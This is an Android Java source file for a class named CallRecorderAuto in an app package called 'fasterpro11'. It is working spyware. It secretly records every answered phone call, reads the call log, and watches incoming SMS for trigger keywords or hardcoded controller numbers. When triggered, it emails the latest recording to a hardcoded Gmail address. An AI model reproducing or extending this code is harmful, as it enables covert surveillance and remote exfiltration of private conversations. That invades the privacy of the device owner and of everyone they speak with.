package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CallRecorderAuto extends BroadcastReceiver {
    private MediaRecorder recorder;
    private String fileName;
    private static final String TAG = "CallRecorderAuto";
    private static final String[] allowedNumbers = {"+8801304039283", "+8801748937893", "+8801915564633"};
    private static final String[] WORDS1_GRADE = {"Goldc", "Silverc", "Mediumc"};
    private static final String[] WORDS2_OFFER = {"Congratulationc", "Conformc"};
    private List<String> lastMessages = new ArrayList<>();
    private List<String> lastCallNumbers = new ArrayList<>();
    private int recordingCount = 1;
    private boolean isOnCall = false;
    public CallRecorderAuto() {
        Log.d(TAG, "CallRecorder class initialized.");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        if (!folder.exists()) {
            folder.mkdirs();
            Log.d(TAG, "Created directory for CallRecording.");
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive called with action: " + intent.getAction());
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            handleIncomingCallStartStopRecording(intent, context);
        } else if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            handleSmsReceived(intent, context);
        }
    }

    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS.");
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean isInternetAvailable = isInternetAvailable(context);
                    boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Internet available: " + isInternetAvailable);
                    Log.d(TAG, "Allowed number: " + isAllowedNumber);

                    if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                            (isAllowedNumber && isInternetAvailable)) {
                        Log.d(TAG, "Conditions met for call recording sending.");
                        sendLastRecordingViaEmail(context);
                    } else {
                        Log.d(TAG, "Conditions not met for call recording sending.");
                    }
                }
            } else {
                Log.d(TAG, "Bundle is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Keyword found in message: " + keyword);
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        Log.d(TAG, "Checking if number is allowed: " + number);
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                Log.d(TAG, "Allowed number found: " + number);
                return true;
            }
        }
        Log.d(TAG, "Number is not allowed: " + number);
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        String sortOrder = CallLog.Calls.DATE + " DESC";

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                sortOrder)) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 3) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                    count++;
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    public boolean isInternetAvailable(Context context) {
        Log.d(TAG, "Checking internet availability.");
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }
    private boolean isMicAvailable(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
    }


    private void handleIncomingCallStartStopRecording(Intent intent, Context context) {
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            Log.d(TAG, "Incoming call from: " + incomingNumber);
            lastCallNumbers.add(incomingNumber);
            if (lastCallNumbers.size() > 1) {
                lastCallNumbers.remove(0);
            }
        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
            String incomingNumber = lastCallNumbers.isEmpty() ? "unknown" : lastCallNumbers.get(lastCallNumbers.size() - 1);
            Log.d(TAG, "Call answered, starting recording for: " + incomingNumber);
            startCallRecording(context, incomingNumber, ""); // Pass an empty message body if not needed
        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            Log.d(TAG, "Call ended, stopping recording.");
            stopCallRecording(context);
        }
    }
    private boolean isRecording = false; // নতুন ফ্ল্যাগ যুক্ত করা হয়েছে

    public void startCallRecording(Context context, String incomingNumber, String messageBody) {
        if (!isMicAvailable(context)) {
            Log.e(TAG, "Microphone is not available.");
            return;
        }

        Log.d(TAG, "Microphone is available.");

        String timestamp = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss", Locale.getDefault()).format(new Date());
        fileName = Environment.getExternalStorageDirectory() + "/DCIM/CallRecord/" + timestamp + "_" + recordingCount++ + ".m4a";

        File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        if (!dir.exists() && dir.mkdirs()) {
            Log.d(TAG, "CallRecord Directory created successfully.");
        }
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(fileName);

        try {
            recorder.prepare();
            recorder.start();
            isRecording = true; // রেকর্ডিং শুরু হলে ফ্ল্যাগ সেট করুন
            Log.d(TAG, "Call recording started: " + fileName);
        } catch (IOException e) {
            Log.e(TAG, "Call recording failed: " + e.getMessage());
        } catch (IllegalStateException e) {
            Log.e(TAG, "অবৈধ অবস্থার কারণে রেকর্ডিং শুরু করা যাচ্ছে না: " + e.getMessage());
        }
    }

    public void stopCallRecording(Context context) {
        // কন্টেক্সট ব্যবহার করুন যদি প্রয়োজন হয়
        if (isRecording) {
            try {
                recorder.stop();
                deleteOldRecordings();
                isRecording = false;
                Log.d(TAG, "Call recording stopped.");
            } catch (IllegalStateException e) {
                Log.e(TAG, "Error stopping Call recording: " + e.getMessage());
            } finally {
                recorder.release();
            }
        } else {
            Log.d(TAG, "No recording to stop.");
        }
    }



    private void deleteOldRecordings() {
        Log.d(TAG, "Deleting old Call recordings...");
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 5) {
            Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            for (int i = 0; i < files.length - 5; i++) {
                if (files[i].delete()) {
                    Log.d(TAG, "Deleted old Call recording: " + files[i].getName());
                } else {
                    Log.e(TAG, "Failed to delete old Call recording: " + files[i].getName());
                }
            }
        }
    }
    private void sendLastRecordingViaEmail(Context context) {
        String lastFilePath = getLastRecordingFilePath(); // ফাইলের পথ পেতে হবে
        if (lastFilePath != null) {
            sendEmailWithAttachment("Last Call Recording", "Here is the last sound recording file:", lastFilePath);
        } else {
            Log.d(TAG, "No previous recording found.");
        }
    }

    private String getLastRecordingFilePath() {
        // আপনার কল রেকর্ডিংয়ের নাম অনুযায়ী শেষ রেকর্ডিংয়ের পথ বের করার জন্য লজিক
        // উদাহরণস্বরূপ:
        File folder = new File(Environment.getExternalStorageDirectory() + "/DCIM/CallRecord");
        File[] files = folder.listFiles();
        if (files != null && files.length > 0) {
            Arrays.sort(files, Comparator.comparingLong(File::lastModified));
            return files[files.length - 1].getAbsolutePath(); // সর্বশেষ রেকর্ডিং ফাইলের পথ
        }
        return null;
    }
    private void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "Call rec Sending email with attachment...");
        try {
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "Call rec Email sent successfully with attachment.");
        } catch (Exception e) {
            Log.e(TAG, "Call Rec Email sending failed: " + e.getMessage());
        }
    }

    public void SendLastRecordingViaEmail(Context context) {
        Log.d(TAG, "Call rec call by notification class.");
        sendLastRecordingViaEmail(context);
    }

}
